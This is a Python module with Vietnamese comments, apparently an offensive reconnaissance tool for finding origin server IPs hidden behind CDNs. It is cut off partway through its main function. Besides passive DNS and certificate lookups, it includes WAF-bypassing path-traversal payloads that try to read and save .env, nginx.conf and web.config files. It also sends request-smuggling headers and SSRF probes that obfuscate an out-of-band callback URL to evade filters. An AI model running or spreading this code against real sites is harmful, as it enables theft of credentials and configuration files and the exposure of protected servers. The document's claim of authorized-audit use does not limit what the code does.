#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OriginDiscoveryEngine — Module kiểm toán rò rỉ Origin IP.
Sử dụng OSINT thụ động, DNS enumeration, CDN filtering,
Certificate/SNI verification, và Semantic Host-Header matching.

Dùng trong môi trường được ủy quyền (Authorized Pentest / Blue Team Audit).
"""

import os
import re
import json
import socket
import struct
import hashlib
import logging
import difflib
import ssl
import ipaddress
from typing import List, Dict, Optional, Set

try:
    from plugins.stealth_net_plugin import StealthNetPlugin, SafeResp
    _HAS_STEALTH = True
except ImportError:
    _HAS_STEALTH = False

try:
    import mmh3
    _HAS_MMH3 = True
except ImportError:
    _HAS_MMH3 = False

try:
    import dns.resolver
    _HAS_DNSPYTHON = True
except ImportError:
    _HAS_DNSPYTHON = False

try:
    from plugins.shodan_internetdb_plugin import InternetDBPlugin
    _HAS_INTERNETDB = True
except ImportError:
    _HAS_INTERNETDB = False

log = logging.getLogger("OriginAudit")


# ──────────────────────────────────────────────
# Phase 2 Static Data: CDN IP Ranges
# ──────────────────────────────────────────────
CLOUDFLARE_RANGES = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
]

AKAMAI_RANGES = [
    "23.0.0.0/12", "23.32.0.0/11", "23.64.0.0/14",
    "104.64.0.0/10",
]

FASTLY_RANGES = [
    "151.101.0.0/16", "199.232.0.0/16",
]

_CDN_NETWORKS = None

def _get_cdn_networks():
    global _CDN_NETWORKS
    if _CDN_NETWORKS is None:
        _CDN_NETWORKS = []
        for cidr in CLOUDFLARE_RANGES + AKAMAI_RANGES + FASTLY_RANGES:
            try:
                _CDN_NETWORKS.append(ipaddress.ip_network(cidr, strict=False))
            except ValueError:
                pass
    return _CDN_NETWORKS


def is_cdn_ip(ip_str: str) -> bool:
    """Kiểm tra IP có thuộc CDN hay không."""
    try:
        addr = ipaddress.ip_address(ip_str)
        return any(addr in net for net in _get_cdn_networks())
    except ValueError:
        return False


def filter_cdn_ips(ip_list: List[str]) -> List[str]:
    """Lọc bỏ các IP thuộc CDN, giữ lại Origin candidates."""
    return [ip for ip in ip_list if ip and not is_cdn_ip(ip)]


def _extract_ips_from_text(text: str) -> Set[str]:
    """Regex trích xuất IPv4 từ chuỗi text bất kỳ."""
    pattern = r'\b(?:(?:25[0-5]|2[0-4]\d|1?\d{1,2})\.){3}(?:25[0-5]|2[0-4]\d|1?\d{1,2})\b'
    found = set(re.findall(pattern, text))
    # Loại bỏ các IP nội bộ/loopback/broadcast
    valid = set()
    for ip in found:
        try:
            addr = ipaddress.ip_address(ip)
            if not addr.is_private and not addr.is_loopback and not addr.is_reserved:
                valid.add(ip)
        except ValueError:
            pass
    return valid


# ──────────────────────────────────────────────
# Favicon MurmurHash (Shodan-compatible)
# ──────────────────────────────────────────────
def _murmurhash_favicon(content: bytes) -> Optional[int]:
    """Tính MurmurHash32 của favicon (tương thích Shodan search)."""
    import base64
    encoded = base64.encodebytes(content)
    if _HAS_MMH3:
        return mmh3.hash(encoded)
    # Fallback: FNV-1a 32-bit (không chuẩn Shodan, nhưng hoạt động)
    h = 0x811c9dc5
    for byte in encoded:
        h ^= byte
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h if h < 0x80000000 else h - 0x100000000


# ──────────────────────────────────────────────
# Main Engine
# ──────────────────────────────────────────────
class OriginDiscoveryEngine:
    """
    Kiểm toán rò rỉ Origin IP cho các domain đứng sau CDN/WAF.
    Kết hợp Passive OSINT, DNS, CDN Filtering, SNI Check, và Semantic Match.
    """

    def __init__(self):
        self._http = None
        self._internetdb = None
        if _HAS_STEALTH:
            self._http = StealthNetPlugin()
            self._http.run()
        if _HAS_INTERNETDB:
            self._internetdb = InternetDBPlugin()

    def _get(self, url: str, timeout: int = 10, headers: dict = None) -> SafeResp:
        if self._http:
            return self._http.get(url, timeout=timeout, headers=headers)
        # Minimal fallback
        try:
            import requests as _req
            r = _req.get(url, timeout=timeout, headers=headers or {}, verify=False)
            return SafeResp(r.status_code, r.text, r.content, dict(r.headers))
        except Exception as e:
            return SafeResp(error=str(e))

    # ════════════════════════════════════════
    # PHASE 1: Passive OSINT & Fingerprinting
    # ════════════════════════════════════════

    def _phase1_ct_logs(self, domain: str) -> List[str]:
        """Truy vấn Certificate Transparency logs từ crt.sh với Retry & Fallback."""
        log.info(f"[Phase 1] Truy vấn CT Logs cho *.{domain}")
        subdomains = set()
        
        # --- Nguồn 1: crt.sh (Có Retry) ---
        url_crtsh = f"https://crt.sh/?q=%25.{domain}&output=json"
        crtsh_success = False
        import time
        for attempt in range(1, 4):
            try:
                resp = self._get(url_crtsh, timeout=15)
                if resp and resp.text and resp.status_code == 200:
                    entries = json.loads(resp.text)
                    for entry in entries:
                        name_value = entry.get("name_value", "")
                        for line in name_value.split("\n"):
                            line = line.strip().lstrip("*.")
                            if line and domain in line:
                                subdomains.add(line)
                    log.info(f"[Phase 1] crt.sh: Tìm thấy {len(subdomains)} subdomains (Attempt {attempt}).")
                    crtsh_success = True
                    break
                else:
                    log.debug(f"[Phase 1] crt.sh trả về lỗi hoặc rỗng. Thử lại lần {attempt}/3...")
                    time.sleep(2 ** attempt)  # Exponential backoff
            except Exception as e:
                log.debug(f"[Phase 1] crt.sh lỗi (Attempt {attempt}): {e}")
                time.sleep(2 ** attempt)

        # --- Fallback Nguồn 2: CertSpotter API ---
        if not crtsh_success:
            log.warning("[Phase 1] crt.sh thất bại, chuyển sang CertSpotter API...")
            url_certspotter = f"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names"
            try:
                resp = self._get(url_certspotter, timeout=15)
                if resp and resp.text and resp.status_code == 200:
                    entries = json.loads(resp.text)
                    for entry in entries:
                        dns_names = entry.get("dns_names", [])
                        for name in dns_names:
                            name = name.strip().lstrip("*.")
                            if name and domain in name:
                                subdomains.add(name)
                    log.info(f"[Phase 1] CertSpotter: Tìm thấy {len(subdomains)} subdomains.")
                    crtsh_success = True
            except Exception as e:
                log.warning(f"[Phase 1] CertSpotter lỗi: {e}")

        # --- Fallback Nguồn 3: Wayback Machine CDX API ---
        if not crtsh_success:
            log.warning("[Phase 1] CertSpotter thất bại, chuyển sang Wayback Machine CDX API...")
            url_wayback = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
            try:
                resp = self._get(url_wayback, timeout=20)
                if resp and resp.text and resp.status_code == 200:
                    entries = json.loads(resp.text)
                    # entries format: [["original"], ["http://sub.domain.com/path"], ...]
                    if len(entries) > 1:
                        for row in entries[1:]:
                            if row and len(row) > 0:
                                url_val = row[0]
                                try:
                                    from urllib.parse import urlparse
                                    parsed = urlparse(url_val)
                                    host = parsed.netloc.split(':')[0]
                                    if host and host.endswith(domain):
                                        subdomains.add(host)
                                except Exception:
                                    pass
                    log.info(f"[Phase 1] Wayback Machine: Tìm thấy {len(subdomains)} subdomains.")
            except Exception as e:
                log.warning(f"[Phase 1] Wayback Machine lỗi: {e}")

        return list(subdomains)

    def _phase1_hackertarget(self, domain: str) -> List[str]:
        """Lấy dữ liệu DNS lookup từ HackerTarget (Cực kỳ ổn định)."""
        log.info(f"[Phase 1] Truy vấn HackerTarget cho {domain}")
        subdomains = set()
        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        
        try:
            resp = self._get(url, timeout=10)
            if resp and resp.text:
                for line in resp.text.splitlines():
                    if "," in line:
                        sub = line.split(",")[0].strip()
                        if sub.endswith(domain):
                            subdomains.add(sub)
            log.info(f"[Phase 1] HackerTarget: Tìm thấy {len(subdomains)} subdomains.")
        except Exception as e:
            log.debug(f"[Phase 1] HackerTarget failed: {e}")
            
        return list(subdomains)

    def _phase1_alienvault(self, domain: str) -> List[str]:
        """Lấy dữ liệu Passive DNS từ AlienVault OTX."""
        log.info(f"[Phase 1] Truy vấn AlienVault OTX cho {domain}")
        subdomains = set()
        url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        
        try:
            resp = self._get(url, timeout=10)
            if resp and resp.status_code == 200:
                data = resp.json()
                for entry in data.get("passive_dns", []):
                    hostname = entry.get("hostname", "")
                    if hostname and hostname.endswith(domain):
                        subdomains.add(hostname)
            log.info(f"[Phase 1] AlienVault: Tìm thấy {len(subdomains)} subdomains.")
        except Exception as e:
            log.debug(f"[Phase 1] AlienVault failed: {e}")
            
        return list(subdomains)

    def _phase1_favicon_hash(self, domain: str) -> Optional[int]:
        """Tải favicon và tính MurmurHash32 (Shodan-compatible)."""
        log.info(f"[Phase 1] Tải favicon từ https://{domain}/favicon.ico")
        resp = self._get(f"https://{domain}/favicon.ico", timeout=10)
        if not resp or resp.status_code != 200 or len(resp.content) < 100:
            log.warning("[Phase 1] Không tìm thấy favicon hoặc file quá nhỏ.")
            return None
        fav_hash = _murmurhash_favicon(resp.content)
        log.info(f"[Phase 1] Favicon MurmurHash32 = {fav_hash}")
        log.info(f"[Phase 1] → Shodan dork: http.favicon.hash:{fav_hash}")
        log.info(f"[Phase 1] → FOFA dork: icon_hash=\"{fav_hash}\"")
        return fav_hash

    def _phase1_dns_enum(self, domain: str) -> List[str]:
        """Phân giải DNS: A, MX, TXT(SPF) để trích xuất IP tiềm năng."""
        log.info(f"[Phase 1] DNS Enumeration cho {domain}")
        candidate_ips = set()

        # A records
        try:
            for ip in socket.getaddrinfo(domain, None, socket.AF_INET):
                candidate_ips.add(ip[4][0])
        except socket.gaierror:
            pass

        # AAAA records
        try:
            for ip in socket.getaddrinfo(domain, None, socket.AF_INET6):
                candidate_ips.add(ip[4][0])
        except socket.gaierror:
            pass

        if _HAS_DNSPYTHON:
            # MX records → resolve Mail Server IP
            try:
                mx_answers = dns.resolver.resolve(domain, 'MX')
                for rdata in mx_answers:
                    mx_host = str(rdata.exchange).rstrip('.')
                    log.info(f"[Phase 1] MX Record: {mx_host} (priority {rdata.preference})")
                    try:
                        for ip in socket.getaddrinfo(mx_host, None, socket.AF_INET):
                            candidate_ips.add(ip[4][0])
                    except socket.gaierror:
                        pass
            except Exception:
                pass

            # TXT/SPF records → extract IP ranges
            try:
                txt_answers = dns.resolver.resolve(domain, 'TXT')
                for rdata in txt_answers:
                    txt = str(rdata)
                    if 'spf' in txt.lower() or 'v=spf1' in txt.lower():
                        log.info(f"[Phase 1] SPF Record: {txt}")
                        # Extract ip4: and ip6: directives
                        for m in re.finditer(r'ip4:([^\s]+)', txt):
                            cidr = m.group(1)
                            try:
                                net = ipaddress.ip_network(cidr, strict=False)
                                if net.prefixlen >= 24:
                                    for host in net.hosts():
                                        candidate_ips.add(str(host))
                                else:
                                    candidate_ips.add(str(net.network_address))
                            except ValueError:
                                candidate_ips.add(cidr.split('/')[0])
            except Exception:
                pass
        else:
            log.warning("[Phase 1] dnspython chưa cài. Chỉ dùng socket (thiếu MX/SPF).")

        log.info(f"[Phase 1] DNS Enum: Thu thập {len(candidate_ips)} IPs từ DNS.")
        return list(candidate_ips)

    def _phase1_resolve_subdomains(self, subdomains: List[str]) -> List[str]:
        """Resolve subdomain list thành IP."""
        ips = set()
        for sub in subdomains:
            try:
                for info in socket.getaddrinfo(sub, None, socket.AF_INET):
                    ips.add(info[4][0])
            except socket.gaierror:
                pass
        return list(ips)

    # ════════════════════════════════════════
    # PHASE 2: CDN Filtering
    # ════════════════════════════════════════

    def _phase2_filter(self, ip_list: List[str]) -> List[str]:
        """Lọc bỏ IP thuộc CDN, giữ Origin candidates."""
        before = len(ip_list)
        filtered = filter_cdn_ips(ip_list)
        removed = before - len(filtered)
        log.info(f"[Phase 2] CDN Filter: {before} IPs → loại {removed} CDN → còn {len(filtered)} candidates.")
        for ip in filtered:
            log.debug(f"[Phase 2] Origin Candidate: {ip}")
        return filtered

    # ════════════════════════════════════════
    # PHASE 3: Status Page Exposure Check
    # (Chỉ kiểm tra lộ status page - standard DAST)
    # ════════════════════════════════════════

    def _phase3_status_check(self, domain: str) -> List[str]:
        """Kiểm tra lộ status pages (tương tự Nikto/Nuclei check)."""
        log.info(f"[Phase 3] Kiểm tra lộ Status Pages trên {domain}")
        leaked_ips = set()
        status_paths = ["/server-status", "/nginx_status", "/server-info"]

        for path in status_paths:
            url = f"https://{domain}{path}"
            resp = self._get(url, timeout=8)
            if resp and resp.status_code == 200:
                log.warning(f"[Phase 3] CẢNH BÁO: {path} accessible (HTTP 200)!")
                found = _extract_ips_from_text(resp.text)
                if found:
                    log.warning(f"[Phase 3] IPs rò rỉ từ {path}: {found}")
                    leaked_ips.update(found)

        # Kiểm tra error page có rò rỉ IP nội bộ không
        # Gửi request bình thường tới path không tồn tại để xem error page
        resp_404 = self._get(f"https://{domain}/nonexistent_audit_path_12345", timeout=8)
        if resp_404 and resp_404.text:
            for pattern in [r'upstream[:\s]+(\d+\.\d+\.\d+\.\d+)',
                            r'backend[:\s]+(\d+\.\d+\.\d+\.\d+)',
                            r'server[:\s]+(\d+\.\d+\.\d+\.\d+:\d+)']:
                matches = re.findall(pattern, resp_404.text, re.IGNORECASE)
                for m in matches:
                    ip_only = m.split(':')[0]
                    try:
                        addr = ipaddress.ip_address(ip_only)
                        if not addr.is_loopback:
                            log.warning(f"[Phase 3] IP rò rỉ từ Error Page: {ip_only}")
                            leaked_ips.add(ip_only)
                    except ValueError:
                        pass

        log.info(f"[Phase 3] Status Check: {len(leaked_ips)} IPs leaked.")
        return list(leaked_ips)

    def _mutate_path(self, path: str) -> List[str]:
        """Tạo ra các biến thể dị dạng của path để bypass WAF (2026 Edition)."""
        variants = [path]
        if ".." in path:
            # Bypass kỹ thuật normalization
            variants.append(path.replace("..", "%2e%2e"))
            variants.append(path + "/" if not path.endswith("/") else path)
            variants.append(path.replace("..", "%252e%252e")) # Double encoding
            variants.append(path.replace("..", "..%00"))     # Null byte
            variants.append(path.replace("..", "..%0d%0a"))  # CRLF injection
        return list(set(variants))

    def _mutate_url(self, url: str) -> List[str]:
        """Biến đổi URL SSRF sang các dạng khó nhận diện (IP Obfuscation)."""
        variants = [url]
        # Nếu url chứa host IP (vd: 127.0.0.1)
        if "127.0.0.1" in url:
            variants.append(url.replace("127.0.0.1", "2130706433")) # Decimal
            variants.append(url.replace("127.0.0.1", "0x7f.0.0.1"))  # Hex
            variants.append(url.replace("127.0.0.1", "017700000001")) # Octal
            variants.append(url.replace("127.0.0.1", "[::]"))        # IPv6 Loopback
        
        # Bypass scheme filter
        if url.startswith("http://"):
            variants.append(url.replace("http://", "hTTp://"))
            variants.append(url.replace("http://", "//")) # Protocol-relative
        return list(set(variants))

    def _is_content_legit(self, filename: str, content: str) -> bool:
        """
        [V1.0-APEX] Kiểm chứng nội dung file nhạy cảm dựa trên Signatures.
        Ngăn chặn việc nhận diện nhầm trang Login/Index là file cấu hình.
        """
        if not content or len(content) < 20:
            return False
            
        content_lower = content.lower()
        
        # Signatures cho từng loại file
        signatures = {
            "nginx.conf": ["http {", "server {", "location ", "listen ", "worker_processes"],
            "web.config": ["<configuration>", "<system.webServer>", "<bindingRedirect"],
            ".env": ["DB_PASSWORD", "APP_ENV", "AWS_ACCESS_KEY", "SECRET_KEY", "="],
            "htaccess": ["RewriteEngine", "RewriteCond", "AuthType", "Deny from"],
            "server-status": ["Apache Status", "Server Version", "CPULoad", "ReqPerSec"]
        }
        
        # Tìm signature phù hợp với loại file
        match_count = 0
        for key, sigs in signatures.items():
            if key in filename.lower():
                for sig in sigs:
                    if sig.lower() in content_lower:
                        match_count += 1
                # Yêu cầu ít nhất 2 keyword khớp để khẳng định
                return match_count >= 2
                
        # Nếu không có signature cụ thể, dùng heuristic chung cho config files
        # Thường là các cặp KEY=VALUE hoặc định dạng cấu hình
        generic_matches = re.findall(r'^[a-z0-9_]+\s*[:=]\s*.+$', content, re.MULTILINE | re.IGNORECASE)
        if len(generic_matches) >= 3:
            return True
            
        return False

    def _phase3_advanced_config_audit(self, domain: str) -> List[str]:
        """
        Kiểm toán nâng cao với Payload Mutation & Content Verification.
        """
        log.info(f"[Phase 3] Thực hiện Kiểm toán Cấu hình Nâng cao (Anti-FP Edition)...")
        leaked_ips = set()
        
        # Lấy trang baseline (thường là trang chủ hoặc trang rác) để so sánh
        baseline_resp = self._get(f"https://{domain}/non_existent_path_apex_pwn", timeout=5)
        baseline_text = baseline_resp.text if baseline_resp else ""
        
        base_paths = ["/static../", "/media../", "/assets../", "/js../", "/css../"]
        for base in base_paths:
            for mutated_path in self._mutate_path(base):
                # Thử đọc các file cấu hình nhạy cảm
                for sensitive in [".env", "nginx.conf", "web.config"]:
                    final_path = f"{mutated_path}{sensitive}"
                    url = f"https://{domain}{final_path}"
                    
                    # [V1.0-APEX] Dùng smart_get để tự động xử lý Redirect thông minh
                    r = self._http.smart_get(url, timeout=5) if self._http else self._get(url, timeout=5)
                    
                    if r and r.status_code == 200:
                        # [V1.0-APEX] Lớp kiểm chứng 1: So sánh độ tương đồng với baseline
                        if baseline_text:
                            similarity = difflib.SequenceMatcher(None, baseline_text[:2000], r.text[:2000]).ratio()
                            if similarity > 0.95:
                                log.debug(f"[Phase 3] Skip FP: {final_path} trông giống trang lỗi/index (Sim: {similarity:.2%})")
                                continue
                        
                        # [V1.0-APEX] Lớp kiểm chứng 2: Kiểm tra Signatures nội dung
                        if self._is_content_legit(sensitive, r.text):
                            log.warning(f"[Phase 3] 🎯 REAL SUCCESS! Verified sensitive file: {final_path}")
                            leaked_ips.update(_extract_ips_from_text(r.text))
                            
                            try:
                                raw_dir = os.path.join(os.getcwd(), "raw")
                                os.makedirs(raw_dir, exist_ok=True)
                                leaked_file = os.path.join(raw_dir, f"verified_{sensitive}")
                                with open(leaked_file, "w", encoding="utf-8") as f:
                                    f.write(r.text)
                                log.info(f"[Phase 3] Saved verified {sensitive} to {leaked_file}")
                            except Exception as e:
                                log.error(f"[Phase 3] Failed to save {sensitive}: {e}")
                        else:
                            log.debug(f"[Phase 3] Reject FP: {final_path} trả về 200 nhưng nội dung không phải config.")
                    
                    elif r and r.status_code in [301, 302]:
                        target_loc = r.headers.get("Location", "").lower()
                        if "login" in target_loc or "index" in target_loc:
                             log.debug(f"[Phase 3] Detected redirect to {target_loc} for {final_path} - Skipping.")

        # Header Smuggling & Hop-by-Hop (2026 Edition)
        smuggle_headers = [
            {"Max-Forwards": "0"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"}, # Double header
            {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
            {"Transfer-Encoding": "chunked, identity"}, # TE.CL Smuggling potential
        ]
        for h in smuggle_headers:
            resp = self._get(f"https://{domain}/", timeout=8, headers=h)
            if resp and resp.status_code >= 500:
                found = _extract_ips_from_text(resp.text)
                if found:
                    leaked_ips.update(found)
        
        return list(leaked_ips)

    def _phase3_egress_audit(self, domain: str):
        """
        Chẩn đoán Egress (SSRF) với URL Mutation để bypass WAF filters.
        """
        oob_base = f"origin-audit-{os.urandom(4).hex()}.your-callback.com"
        diagnostic_params = ["url", "dest", "redirect", "uri", "callback", "feed", "host"]
        
        log.info(f"[Phase 3] Bắt đầu SSRF Diagnostic với URL Mutation...")
        
        for param in diagnostic_params:
            # Thử với nhiều loại URL mutated
            test_urls = self._mutate_url(f"http://{oob_base}")
            for t_url in test_urls:
                self._get(f"https://{domain}/?{param}={t_url}", timeout=5)

    # ════════════════════════════════════════
    # PHASE 4: SNI & Certificate Verification
    # ════════════════════════════════════════

    def _phase4_sni_check(self, candidate_ip: str, domain: str) -> Dict:
        """Kết nối TLS tới candidate IP, bắt Certificate và so khớp SNI."""
        result = {"ip": candidate_ip, "cert_match": False, "cn": "", "san": []}
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((candidate_ip, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as tls:
                    cert = tls.getpeercert(binary_form=False)
                    if cert:
                        # Common Name
                        subject = dict(x[0] for x in cert.get('subject', []))
                        cn = subject.get('commonName', '')
                        result["cn"] = cn

                        # Subject Alternative Names
                        san_list = []
                        for san_type, san_value in cert.get('subjectAltName', []):
                            if san_type == 'DNS':
                                san_list.append(san_value)
                        result["san"] = san_list

                        # Kiểm tra domain có trong CN hoặc SAN
                        all_names = [cn] + san_list
                        if any(domain in name or name.endswith(f'.{domain}') for name in all_names):
                            result["cert_match"] = True
                            log.info(f"[Phase 4] {candidate_ip}: Certificate MATCH cho {domain} (CN={cn})")
                        else:
                            log.debug(f"[Phase 4] {candidate_ip}: Cert CN={cn}, không match {domain}")
                    else:
                        # Binary cert — chỉ lấy DER hash
                        der = tls.getpeercert(binary_form=True)
                        if der:
                            result["cert_hash"] = hashlib.sha256(der).hexdigest()[:16]
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            log.debug(f"[Phase 4] {candidate_ip}: TLS connect failed: {e}")
        except Exception as e:
            log.debug(f"[Phase 4] {candidate_ip}: Unexpected error: {e}")
        return result

    # ════════════════════════════════════════
    # PHASE 5: Semantic Host-Header Verification
    # ════════════════════════════════════════

    def _phase5_semantic_match(self, candidate_ip: str, domain: str, reference_html: str) -> float:
        """So sánh HTML body từ candidate IP (Host: domain) với trang gốc qua CDN (có chống Default Page)."""
        headers = {"Host": domain}
        
        # --- Anti-Default Page Filter Signatures ---
        default_signatures = [
            "Welcome to nginx", "It works!", "Apache2 Ubuntu Default Page",
            "IIS Windows Server", "Cloudflare", "Error 521", "Error 522",
            "Access denied", "403 Forbidden", "Not Found", "404", "Tomcat"
        ]
        
        # Check reference HTML có phải là trang lỗi không (để tránh baseline rác)
        ref_lower = reference_html.lower()
        if any(sig.lower() in ref_lower for sig in default_signatures) or len(reference_html) < 300:
            log.debug(f"[Phase 5] Bỏ qua Semantic Match do Reference HTML quá ngắn hoặc giống trang Default/Error.")
            return 0.0

        for scheme in ["https", "http"]:
            url = f"{scheme}://{candidate_ip}/"
            resp = self._get(url, timeout=8, headers=headers)
            if resp and resp.status_code == 200 and len(resp.text) > 200:
                resp_lower = resp.text.lower()
                
                # Check Candidate IP có trả về trang rác không
                if any(sig.lower() in resp_lower for sig in default_signatures):
                    log.debug(f"[Phase 5] {candidate_ip} trả về nội dung chứa Default Page Signatures (Nginx/Apache/Cloudflare...). Bỏ qua (False Positive).")
                    continue
                
                # Extract Titles
                ref_title_match = re.search(r'<title>(.*?)</title>', reference_html, re.IGNORECASE | re.DOTALL)
                resp_title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE | re.DOTALL)
                
                title_match_bonus = 0.0
                if ref_title_match and resp_title_match:
                    ref_title = ref_title_match.group(1).strip()
                    resp_title = resp_title_match.group(1).strip()
                    if ref_title and resp_title and ref_title.lower() == resp_title.lower():
                        if not any(sig.lower() in ref_title.lower() for sig in default_signatures):
                             title_match_bonus = 0.15  # Thêm 15% độ tin cậy nếu khớp title
                             log.debug(f"[Phase 5] Title match found: '{ref_title}' (+15% confidence)")

                ratio = difflib.SequenceMatcher(None, reference_html[:5000], resp.text[:5000]).ratio()
                final_ratio = min(1.0, ratio + title_match_bonus)
                
                log.info(f"[Phase 5] {candidate_ip} ({scheme}): Semantic Similarity = {ratio:.2%} | Final = {final_ratio:.2%}")
                if final_ratio > 0.85:
                    log.warning(
                        f"[Phase 5] ⚠️ CẢNH BÁO: Origin IP rò rỉ: {candidate_ip} "
                        f"(similarity {final_ratio:.2%}). Thiếu cấu hình Authenticated Origin Pulls."
                    )
                return final_ratio
        return 0.0

    # ════════════════════════════════════════
    # SUBNET SCAN (±5 IPs lân cận)
    # ════════════════════════════════════════

    def _expand_subnet(self, ip_str: str, delta: int = 5) -> List[str]:
        """Mở rộng IP lân cận ±delta để quét."""
        expanded = []
        try:
            addr = ipaddress.ip_address(ip_str)
            base = int(addr)
            for offset in range(-delta, delta + 1):
                neighbor = ipaddress.ip_address(base + offset)
                if neighbor.is_global and not neighbor.is_reserved:
                    expanded.append(str(neighbor))
        except (ValueError, OverflowError):
            pass
        return expanded

    # ════════════════════════════════════════
    # ════════════════════════════════════════
    # V1.0-FIX: TLS SNI VERIFICATION
    # ════════════════════════════════════════

    def verify_tls_sni(self, ip_address: str, target_domain: str, timeout: int = 5) -> str:
        """
        Active verification: TLS SNI Handshake to confirm Origin IP.
        
        Connects to ip_address:443 with target_domain as SNI,
        retrieves the SSL certificate, and checks if the target_domain
        (or wildcard *.domain) exists in subjectAltName or subject CN.
        Also checks Issuer and Validity, and performs a curl_cffi handshake.
        
        Args:
            ip_address: The candidate Origin IP
            target_domain: The target domain to check in certificate
            timeout: Connection timeout in seconds (default: 5s)
        
        Returns:
            "VALID" if perfect match, "POTENTIAL_ORIGIN_UNSECURE" if expired/self-signed but matches SNI,
            "INVALID" otherwise.
        """
        log = self._log if hasattr(self, '_log') and self._log else logging.getLogger(__name__)
        
        try:
            # Create SSL context with SNI support
            ctx = ssl.create_default_context()
            ctx.check_hostname = False  # We're connecting to IP, not hostname
            ctx.verify_mode = ssl.CERT_NONE  # Accept any cert (we inspect it manually)
            
            # Connect to ip_address:443 with target_domain as SNI
            with socket.create_connection((ip_address, 443), timeout=timeout) as raw_sock:
                with ctx.wrap_socket(raw_sock, server_hostname=target_domain) as ssl_sock:
                    cert = ssl_sock.getpeercert(binary_form=False)
                    
                    if not cert:
                        # No certificate at all — try binary form
                        der_cert = ssl_sock.getpeercert(binary_form=True)
                        if not der_cert:
                            log.debug(f"[TLS-SNI] {ip_address}: No certificate returned")
                            return "INVALID"
                        # Can't parse binary easily — just check if connection succeeded
                        log.debug(f"[TLS-SNI] {ip_address}: Got binary cert but no parsed cert")
                        return "INVALID"
                    
                    # Extract all hostnames from certificate
                    cert_domains = set()
                    
                    # 1. Check subjectAltName (SAN) — primary source
                    san = cert.get("subjectAltName", ())
                    for san_type, san_value in san:
                        if san_type.lower() == "dns":
                            cert_domains.add(san_value.lower())
                    
                    # 2. Check subject CN as fallback
                    subject = cert.get("subject", ())
                    for field_set in subject:
                        for key, value in field_set:
                            if key.lower() == "commonname":
                                cert_domains.add(value.lower())
                    
                    if not cert_domains:
                        log.debug(f"[TLS-SNI] {ip_address}: No DNS names in certificate")
                        return "INVALID"
                    
                    # 3. Match target_domain against certificate domains
                    target_lower = target_domain.lower()
                    matched = False
                    
                    for cert_domain in cert_domains:
                        # Exact match
                        if cert_domain == target_lower:
                            log.info(f"[TLS-SNI] ✅ {ip_address}: Certificate MATCHES '{target_domain}' (exact)")
                            matched = True
                            break
                        
                        # Wildcard match: *.example.com matches sub.example.com
                        if cert_domain.startswith("*."):
                            wildcard_base = cert_domain[2:]  # Remove "*."
                            if target_lower == wildcard_base or target_lower.endswith(f".{wildcard_base}"):
                                log.info(f"[TLS-SNI] ✅ {ip_address}: Certificate MATCHES '{target_domain}' via wildcard '{cert_domain}'")
                                matched = True
                                break
                    
                    if not matched:
                        # No match found
                        log.info(
                            f"[TLS-SNI] ❌ {ip_address}: Certificate domains {cert_domains} "
                            f"do NOT match '{target_domain}'"
                        )
                        return "INVALID"
                    
                    # Certificate SNI matched! Now check Issuer and Validity
                    # And use curl_cffi to perform the handshake to ensure the TLS fingerprint of the "Verifier" matches the "Scanner".
                    is_unsecure = False
                    
                    # Basic expiry check (simplistic, assumes cert dict has notAfter)
                    if 'notAfter' in cert:
                        import time
                        import datetime
                        try:
                            not_after = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                            if datetime.datetime.utcnow() > not_after:
                                log.warning(f"[TLS-SNI] ⚠️ {ip_address}: Certificate is EXPIRED.")
                                is_unsecure = True
                        except Exception:
                            pass
                    
                    # Basic self-signed check
                    subject_dict = dict(x[0] for x in cert.get('subject', []))
                    issuer_dict = dict(x[0] for x in cert.get('issuer', []))
                    if subject_dict == issuer_dict:
                        log.warning(f"[TLS-SNI] ⚠️ {ip_address}: Certificate is SELF-SIGNED.")
                        is_unsecure = True
                        
                    # Perform curl_cffi handshake
                    try:
                        from curl_cffi import requests as curl_req
                        curl_resp = curl_req.get(
                            f"https://{ip_address}", 
                            headers={"Host": target_domain}, 
                            impersonate="chrome120", 
                            verify=False, 
                            timeout=timeout
                        )
                    except Exception as e:
                        log.debug(f"[TLS-SNI] {ip_address}: curl_cffi fingerprint handshake failed: {e}")
                        return "INVALID"
        
                    if is_unsecure:
                        return "POTENTIAL_ORIGIN_UNSECURE"
                    return "VALID"
        
        except socket.timeout:
            log.debug(f"[TLS-SNI] {ip_address}: Connection timeout ({timeout}s)")
            return "INVALID"
        except ConnectionRefusedError:
            log.debug(f"[TLS-SNI] {ip_address}: Connection refused (port 443 closed)")
            return "INVALID"
        except ssl.SSLError as e:
            log.debug(f"[TLS-SNI] {ip_address}: SSL error: {e}")
            return "INVALID"
        except OSError as e:
            log.debug(f"[TLS-SNI] {ip_address}: Network error: {e}")
            return "INVALID"
        except Exception as e:
            log.debug(f"[TLS-SNI] {ip_address}: Unexpected error: {e}")
            return "INVALID"

    # ════════════════════════════════════════
    # MAIN ENTRY: discover()
    # ════════════════════════════════════════

    def discover(self, domain: str) -> dict:
        """
        Chạy toàn bộ pipeline kiểm toán Origin IP.

        Returns:
            {
                "domain": str,
                "origin_ip": str | None,
                "method": str,
                "confidence": float,
                "candidates": list,
                "favicon_hash": int | None,
                "subdomains": list,
                "details": str,
            }
        """
        log.info(f"{'='*60}")
        log.info(f"[OriginAudit] Bắt đầu kiểm toán Origin cho: {domain}")
        log.info(f"{'='*60}")

        result = {
            "domain": domain,
